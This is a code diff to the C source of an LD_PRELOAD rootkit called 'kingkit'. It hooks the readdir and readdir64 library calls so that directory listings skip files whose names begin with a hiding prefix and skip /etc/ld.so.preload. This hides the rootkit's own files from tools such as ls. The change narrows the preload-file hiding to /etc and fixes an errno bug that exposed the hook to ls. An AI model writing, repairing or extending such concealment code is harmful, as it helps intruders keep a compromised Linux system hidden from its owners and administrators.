@@ -146,11 +146,11 @@ char *fd_to_path(int fd) {
 }
 
 
-char *dirfd_pathname_to_path(int dirfd, const char *pathname) {
+char *dirfd_pathname_to_path(int dir_fd, const char *pathname) {
     #if DEBUG
-    printf("[kingkit] dirfd_pathname_to_path() called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
+    printf("[kingkit] dirfd_pathname_to_path() called with dir_fd: %d and pathname: %s.\n", dir_fd, pathname);
     #endif
-    if (pathname[0] == '/' || dirfd == AT_FDCWD) {
+    if (pathname[0] == '/' || dir_fd == AT_FDCWD) {
         char *path;
         path = realpath(pathname, NULL);
         return path;
@@ -158,7 +158,7 @@ char *dirfd_pathname_to_path(int dirfd, const char *pathname) {
     char *dir;
     char merged_path[PATH_MAX];
     char *path;
-    dir = fd_to_path(dirfd);
+    dir = fd_to_path(dir_fd);
     if (dir == NULL)
         return NULL;
     snprintf(merged_path, PATH_MAX, "%s/%s", dir, pathname);
@@ -285,9 +285,18 @@ struct dirent *readdir(DIR *dirp) {
     printf("[kingkit] readdir called.\n");
     #endif
     original_readdir = syscall_address(original_readdir, "readdir");
+    int fd = dirfd(dirp);
+    char *dir_path = fd_to_path(fd);
+    errno = 0; //set errno to 0 or ls will think that an error occured when NULL is returned at the end of the directory, realpath() in fd_to_path() seems to set errno to 22 (EINVAL)
     struct dirent *ep = (*original_readdir)(dirp);
-    while (ep != NULL && (!strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) || (!strcmp(ep->d_name, "ld.so.preload") && access(FAKE_PRELOAD, F_OK)) ))
-        ep = (*original_readdir)(dirp);
+    while (ep != NULL && (
+        !strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) ||
+        (!strcmp(dir_path, "/etc") && !strcmp(ep->d_name, "ld.so.preload") && access(FAKE_PRELOAD, F_OK) )
+        )
+    ) {
+        ep = (*original_readdir)(dirp); //skip this entry
+    }
+    free(dir_path);
     return ep;
 }
 
@@ -297,9 +306,17 @@ struct dirent64 *readdir64(DIR *dirp) {
     printf("[kingkit] readdir64 called.\n");
     #endif
     original_readdir64 = syscall_address(original_readdir64, "readdir64");
+    int fd = dirfd(dirp);
+    char *dir_path = fd_to_path(fd);
     struct dirent64 *ep = (*original_readdir64)(dirp);
-    while (ep != NULL && (!strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) || (!strcmp(ep->d_name, "ld.so.preload") && access(FAKE_PRELOAD, F_OK)) ))
-        ep = (*original_readdir64)(dirp);
+    while (ep != NULL && (
+        !strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) ||
+        (!strcmp(dir_path, "/etc") && !strcmp(ep->d_name, "ld.so.preload") && access(FAKE_PRELOAD, F_OK) )
+        )
+    ) {
+        ep = (*original_readdir64)(dirp); //skip this entry
+    }
+    free(dir_path);
     return ep;
 }
 
